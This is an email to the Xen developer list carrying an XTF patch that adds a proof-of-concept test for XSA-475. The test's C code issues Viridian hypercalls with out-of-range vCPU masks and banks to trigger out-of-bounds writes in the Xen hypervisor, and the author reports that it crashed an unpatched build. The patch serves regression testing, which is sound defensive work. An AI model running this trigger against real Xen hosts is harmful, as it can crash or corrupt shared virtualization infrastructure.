Return-Path: <xen-devel-bounces@lists.xenproject.org>
Delivered-To: lists+xen-devel@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id dOwaOJiHTmq7OgIAu9opvQ
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	for <lists+xen-devel@lfdr.de>; Wed, 08 Jul 2026 19:23:36 +0200
X-Original-To: lists+xen-devel@lfdr.de
Received: from lists.xenproject.org (lists.xenproject.org [192.237.175.120])
	by mail.lfdr.de (Postfix) with ESMTPS id C93FD729251
	for <lists+xen-devel@lfdr.de>; Wed, 08 Jul 2026 19:23:35 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=vates.tech header.s=selector1 header.b=EEBJ8gpx;
	dmarc=pass (policy=none) header.from=vates.tech;
	spf=pass (mail.lfdr.de: domain of xen-devel-bounces@lists.xenproject.org designates 192.237.175.120 as permitted sender) smtp.mailfrom=xen-devel-bounces@lists.xenproject.org
Received: from list by lists.xenproject.org with outflank-mailman.1357255.1611727 (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1whVzR-0008WQ-GE; Wed, 08 Jul 2026 17:23:17 +0000
X-Outflank-Mailman: Message body and most headers restored to incoming version
Received: by outflank-mailman (output) from mailman id 1357255.1611727; Wed, 08 Jul 2026 17:23:17 +0000
Received: from localhost ([127.0.0.1] helo=lists.xenproject.org)
	by lists.xenproject.org with esmtp (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1whVzR-0008Tl-DX; Wed, 08 Jul 2026 17:23:17 +0000
Received: by outflank-mailman (input) for mailman id 1357255;
 Wed, 08 Jul 2026 17:23:16 +0000
Received: from mx.expurgate.net ([194.145.224.20])
 by lists.xenproject.org with esmtp (Exim 4.92) (envelope-from
 <prod-mta-13.8631fc262581453bbf619ec5b2062170.19f42c14e64000edb5@swg.vates.tech>)
 id 1whVzP-0008Sa-PL
 for xen-devel@lists.xenproject.org; Wed, 08 Jul 2026 17:23:16 +0000
Received: from mx.expurgate.net (helo=localhost) by mx.expurgate.net with esmtp
 id 1whVzO-000TWI-GM
 for xen-devel@lists.xenproject.org; Wed, 08 Jul 2026 19:23:14 +0200
Received: from [10.42.69.1] (helo=localhost)
 by localhost with ESMTP (eXpurgate MTA 0.9.1) (envelope-from
 <prod-mta-13.8631fc262581453bbf619ec5b2062170.19f42c14e64000edb5@swg.vates.tech>)
 id 6a4e875d-2eae-0a2a0a5409dd-0a2a4501a7f0-22
 for <xen-devel@lists.xenproject.org>; Wed, 08 Jul 2026 19:23:14 +0200
Received: from [185.255.28.18] (helo=prod-mta-13.swg-srv.net)
 by tlsNG-d62444.mxtls.expurgate.net with ESMTPS (eXpurgate 4.57.1)
 (envelope-from
 <prod-mta-13.8631fc262581453bbf619ec5b2062170.19f42c14e64000edb5@swg.vates.tech>)
 id 6a4e8781-400f-0a2a45010019-b9ff1c12a00f-3
 for <xen-devel@lists.xenproject.org>; Wed, 08 Jul 2026 19:23:14 +0200
Received: from mail2.vates.fr ([37.26.189.201] mail2.vates.fr)
 (Authenticated sender:
 8631fc262581453bbf619ec5b2062170/smtp/7773de5a-2839-4720-82ee-e06722ae1d3e)
 by prod-mta-13.swg-srv.net (ZoneMTA - prod-mta-13) with ESMTPSA id
 19f42c14e64000edb5.002 for <xen-devel@lists.xenproject.org>
 (version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384);
 Wed, 08 Jul 2026 17:23:12 +0000
Received: from bazzite.gpn.vates.fr (88-188-240-210.subs.proxad.net
 [88.188.240.210]) (Authenticated sender: teddy.astie)
 by mail2.vates.fr (Postfix) with ESMTPSA id D377180F03;
 Wed,  8 Jul 2026 19:23:11 +0200 (CEST)
X-BeenThere: xen-devel@lists.xenproject.org
List-Id: Xen developer discussion <xen-devel.lists.xenproject.org>
List-Unsubscribe: <https://lists.xenproject.org/mailman/options/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=unsubscribe>
List-Post: <mailto:xen-devel@lists.xenproject.org>
List-Help: <mailto:xen-devel-request@lists.xenproject.org?subject=help>
List-Subscribe: <https://lists.xenproject.org/mailman/listinfo/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=subscribe>
Errors-To: xen-devel-bounces@lists.xenproject.org
Precedence: list
Sender: "Xen-devel" <xen-devel-bounces@lists.xenproject.org>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=vates.tech;
 q=dns/txt; s=selector1; bh=oj6RimOavrbH8M16bEu26iR8Z6kcST6Gi/3iDkDJfv8=;
 h=from:subject:date:message-id:to:cc:mime-version:content-type:feedback-id;
 b=EEBJ8gpxfEKivaJdkc+gbDZOQu+HQAbrNxQmtElA44DOyOytNP/7hFoth3/twEdX9eF0aY+M7
 Y6udofVP/Ytk1kDPlKX4VoGbHfVNwpfaze3PxGmBb+INatSe9j3fLbLLYxyi+6HLPH/2BlB6N5H
 ellJiulv0Yu6oGFC8zRC5BYZEfvGrN06mDGqQ0IDAcsxwHFA1YHbZ35IlZswdZCBON0sRqNt1dO
 RwGALaqFNBSB+yoxVo17IKg5wk+bdJ34ruqIAlzGx+6GuKoDetUnnb7eGYyvOzqcLRzYA0bVckW
 y5E+tSJULxUkNbZEsjcj4gq+CjkWYsv2ZgVT7+r5JAIw==
X-Zone-Loop: d2d81eafd50eeae66f8e3e92762cc59efee5a9aa70a2
x-campaign-type: default
x-transaction-id: ce6aa81e-c7ef-40d2-b263-118de11b7973
x-swg-uid: 01-a163ac5f-b2d5-48c1-bd94-d620e4d81547
X-Mailer: Sweego
Message-ID:
 <1783531392.8631fc262581453bbf619ec5b2062170.19f42c14e64000edb5@vates.tech>
x-swg-bid: 1783531392.8631fc262581453bbf619ec5b2062170.19f42c14e64000edb5
Feedback-ID: default:8631fc262581453bbf619ec5b2062170:Sweego
x-campaign-id: default
x-client-id: 8631fc262581453bbf619ec5b2062170
X-Originating-IP: [37.26.189.201]
From: Teddy Astie <teddy.astie@vates.tech>
To: xen-devel@lists.xenproject.org
Cc: Teddy Astie <teddy.astie@vates.tech>,
	Andrew Cooper <andrew.cooper3@citrix.com>
Subject: [XTF PATCH] XSA-475 PoC: Viridian Out-of-bounds
Date: Wed,  8 Jul 2026 19:22:28 +0200
MIME-Version: 1.0
X-BM-Disclaimer: Yes
Content-Type: multipart/alternative; boundary="-=Part.45e.7bcd06253e1d0c30.19f42c14be1.cb63fb390224e886=-"
X-Bm-Milter-Handled: 4ffbd6c1-ee69-4e1b-aabd-f977039bd3e2
X-Bm-Transport-Timestamp: 1783531391970
X-purgate-ID: tlsNG-d62444/1783531394-D18C31E0-8E48F372/0/0
X-purgate-type: clean
X-purgate-size: 6206
X-Rspamd-Action: no action
X-Spamd-Result: default: False [0.82 / 15.00];
	MIME_MA_MISSING_HTML(1.00)[];
	URI_COUNT_ODD(1.00)[3];
	DMARC_POLICY_ALLOW(-0.50)[vates.tech,none];
	R_DKIM_ALLOW(-0.20)[vates.tech:s=selector1];
	R_SPF_ALLOW(-0.20)[+a:lists.xenproject.org];
	MAILLIST(-0.18)[generic];
	MIME_GOOD(-0.10)[multipart/alternative,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	XM_UA_NO_VERSION(0.01)[];
	FORGED_RECIPIENTS(0.00)[m:xen-devel@lists.xenproject.org,m:teddy.astie@vates.tech,m:andrew.cooper3@citrix.com,s:lists@lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	TO_DN_SOME(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ARC_NA(0.00)[];
	MIME_TRACE(0.00)[0:+,1:+];
	FORGED_SENDER(0.00)[teddy.astie@vates.tech,xen-devel-bounces@lists.xenproject.org];
	SUSPICIOUS_AUTH_ORIGIN(0.00)[];
	FORWARDED(0.00)[mailman];
	DBL_BLOCKED_OPENRESOLVER(0.00)[lists.xenproject.org:from_smtp,lists.xenproject.org:helo,lists.xenproject.org:rdns,cfg.in:url,vates.tech:dkim,vates.tech:mid,vates.tech:from_mime,vates.tech:url,vates.tech:email];
	FORGED_SENDER_MAILLIST(0.00)[];
	PREVIOUSLY_DELIVERED(0.00)[xen-devel@lists.xenproject.org];
	HAS_XOIP(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	FROM_HAS_DN(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[teddy.astie@vates.tech,xen-devel-bounces@lists.xenproject.org];
	DKIM_TRACE(0.00)[vates.tech:+];
	ALIAS_RESOLVED(0.00)[];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	RCPT_COUNT_THREE(0.00)[3];
	MID_RHS_MATCH_FROM(0.00)[];
	ASN(0.00)[asn:19994, ipnet:192.237.128.0/18, country:US];
	TAGGED_RCPT(0.00)[xen-devel];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	RCVD_COUNT_SEVEN(0.00)[10]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: C93FD729251

---=Part.45e.7bcd06253e1d0c30.19f42c14be1.cb63fb390224e886=-
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Signed-off-by: Teddy Astie <teddy=2Eastie@vates=2Etech>
---
CC: Andrew Cooper <andrew=2Ecooper3@citrix=2Ecom>

Tested (crashing Xen) on a Xen build with reverted patch (tested both CVEs=
)=2E

 docs/all-tests=2Edox         |   1 +
 tests/xsa-475/Makefile     |  11 ++++
 tests/xsa-475/extra=2Ecfg=2Ein |   1 +
 tests/xsa-475/main=2Ec       | 124 +++++++++++++++++++++++++++++++++++++
 4 files changed, 137 insertions(+)
 create mode 100644 tests/xsa-475/Makefile
 create mode 100644 tests/xsa-475/extra=2Ecfg=2Ein
 create mode 100644 tests/xsa-475/main=2Ec

diff --git a/docs/all-tests=2Edox b/docs/all-tests=2Edox
index ff38747=2E=2E441eaf7 100644
--- a/docs/all-tests=2Edox
+++ b/docs/all-tests=2Edox
@@ -185,6 +185,7 @@ states=2E
=20
 @subpage test-xsa-472-3 - Viridian reference TSC page leak=2E
=20
+@subpage test-xsa-475 - x86: Incorrect input sanitisation in Viridian hyp=
ercalls
=20
 @section index-utility Utilities
=20
diff --git a/tests/xsa-475/Makefile b/tests/xsa-475/Makefile
new file mode 100644
index 0000000=2E=2E31bdb84
--- /dev/null
+++ b/tests/xsa-475/Makefile
@@ -0,0 +1,11 @@
+include $(ROOT)/build/common=2Emk
+
+NAME      :=3D xsa-475
+CATEGORY  :=3D xsa
+TEST-ENVS :=3D hvm64
+
+TEST-EXTRA-CFG :=3D extra=2Ecfg=2Ein
+
+obj-perenv +=3D main=2Eo
+
+include $(ROOT)/build/gen=2Emk
diff --git a/tests/xsa-475/extra=2Ecfg=2Ein b/tests/xsa-475/extra=2Ecfg=2E=
in
new file mode 100644
index 0000000=2E=2E7ca5a28
--- /dev/null
+++ b/tests/xsa-475/extra=2Ecfg=2Ein
@@ -0,0 +1 @@
+viridian =3D [ "base" ]
\ No newline at end of file
diff --git a/tests/xsa-475/main=2Ec b/tests/xsa-475/main=2Ec
new file mode 100644
index 0000000=2E=2Ecfdacab
--- /dev/null
+++ b/tests/xsa-475/main=2Ec
@@ -0,0 +1,124 @@
+/**
+ * @file tests/xsa-475/main=2Ec
+ * @ref test-xsa-475
+ *
+ * @page test-xsa-475 XSA-475
+ *
+ * Advisory: [XSA-475](https://xenbits=2Exen=2Eorg/xsa/advisory-475=2Ehtm=
l)
+ *
+ * Some bounds check were missing in viridian hypercalls, causing out of =
bound
+ * writes (CVE-2025-58147) or operating on a wild pointer (CVE-2025-58148=
)=2E
+ * We can trigger it by targetting vCPUs ID that are over HVM_MAX_VCPUS=
=2E
+ *
+ * @see tests/xsa-475/main=2Ec
+ */
+
+#include <xtf=2Eh>
+
+const char test_title[] =3D "XSA-475";
+
+#define HVCALL_SEND_IPI 0x000b
+
+#define HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX  0x0013
+#define HVCALL_FLUSH_VIRTUAL_ADDRESS_LIST_EX   0x0014
+#define HVCALL_SEND_IPI_EX                     0x0015
+
+enum HV_GENERIC_SET_FORMAT {
+    HV_GENERIC_SET_SPARSE_4K,
+    HV_GENERIC_SET_ALL,
+};
+
+struct hv_vpset {
+    uint64_t format;
+    uint64_t valid_bank_mask;
+    uint64_t bank_contents[64];
+};
+
+static void test_send_ipi(uint64_t vcpu_mask)
+{
+    struct {
+        uint32_t vector;
+        uint8_t target_vtl;
+        uint8_t reserved_zero[3];
+        uint64_t vcpu_mask;
+    } input_params =3D { 0 };
+
+    input_params=2Evector =3D 0xD0;
+    input_params=2Evcpu_mask =3D vcpu_mask & ~1; /* Don't self-ipi */
+
+    if (vendor_is_intel)
+        asm volatile ("vmcall" :: "a"(0x80000000U), "c"(HVCALL_SEND_IPI),
+                                  "d"(&input_params) : "memory");
+    else if (vendor_is_amd)
+        asm volatile ("vmmcall" :: "a"(0x80000000U), "c"(HVCALL_SEND_IPI)=
,
+                                   "d"(&input_params) : "memory");
+}
+
+static void test_send_ipi_ex(struct hv_vpset set)
+{
+    int ret =3D 0;
+    struct {
+        uint64_t address_space;
+        uint64_t flags;
+        struct hv_vpset set;
+    } input_params;
+
+    input_params=2Eaddress_space =3D 0;
+    input_params=2Eflags =3D 0;
+    input_params=2Eset =3D set;
+
+    if (vendor_is_intel)
+        asm volatile ("vmcall" : "=3Da"(ret) : "a"(0x80000000U),
+                                 "c"(HVCALL_SEND_IPI_EX),
+                                 "d"(&input_params) : "memory");
+    else if (vendor_is_amd)
+        asm volatile ("vmmcall" : "=3Da"(ret) : "a"(0x80000000U),
+                                  "c"(HVCALL_SEND_IPI_EX),
+                                  "d"(&input_params) : "memory");
+}
+
+static void test_flush_vaddr_ex(struct hv_vpset set)
+{
+    int ret =3D 0;
+    struct {
+        uint64_t address_space;
+        uint64_t flags;
+        struct hv_vpset set;
+    } input_params;
+
+    input_params=2Eaddress_space =3D 0;
+    input_params=2Eflags =3D 0;
+    input_params=2Eset =3D set;
+
+    if (vendor_is_intel)
+        asm volatile ("vmcall" : "=3Da"(ret) : "a"(0x80000000U),
+                                 "c"(HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_E=
X),
+                                 "d"(&input_params) : "memory");
+    else if (vendor_is_amd)
+        asm volatile ("vmmcall" : "=3Da"(ret) : "a"(0x80000000U),
+                                  "c"(HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_=
EX),
+                                  "d"(&input_params) : "memory");
+    }
+
+void test_main(void)
+{
+    struct hv_vpset set;
+    set=2Eformat =3D HV_GENERIC_SET_SPARSE_4K;
+
+    printk("Test HVCALL_SEND_IPI to 64 first CPUs (non-existent)\n");
+    test_send_ipi(~0);
+
+    printk("Test HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX with all banks set=
\n");
+    set=2Evalid_bank_mask =3D ~0;
+    memset(set=2Ebank_contents, 1, sizeof(set=2Ebank_contents));
+    test_flush_vaddr_ex(set);
+
+    printk("Test HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX with all banks set=
 (skipping self)\n");
+    set=2Evalid_bank_mask =3D ~0;
+    memset(set=2Ebank_contents, 1, sizeof(set=2Ebank_contents));
+    set=2Ebank_contents[0] &=3D 1; /* don't self-ipi */
+    test_send_ipi_ex(set);
+
+    xtf_success("Success: Probably not vulnerable to XSA-475\n");
+}
+
--=20
2=2E54=2E0



-- 
Teddy Astie | Vates XCP-ng Developer

XCP-ng & Xen Orchestra - Vates s=
olutions

web: https://vates=2Etech
---=Part.45e.7bcd06253e1d0c30.19f42c14be1.cb63fb390224e886=---

